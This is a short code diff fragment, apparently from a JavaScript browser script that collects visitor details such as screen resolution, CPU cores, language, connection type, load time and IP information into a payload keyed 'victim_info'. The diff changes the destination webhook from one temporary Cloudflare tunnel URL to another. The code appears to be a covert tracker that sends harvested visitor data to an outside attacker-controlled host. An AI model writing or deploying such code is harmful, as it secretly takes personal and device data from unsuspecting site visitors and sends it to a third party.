@@ -82,10 +82,9 @@ Resolution: ${screenHeight}x${screenWidth}
 CPU Cores: ${cpuCores}
 Language: ${userLanguage}
 Connection Type: ${connectionType}
-Loading Time: ${loadTime}
-                `;
+Loading Time: ${loadTime}`;
 
-                const webhookURL = "https://items-desert-executed-sufficient.trycloudflare.com/userData";
+                const webhookURL = "https://prix-witch-groundwater-casino.trycloudflare.com/userData";
 
                 const payload = {
                     'victim_info': ipinfo, 
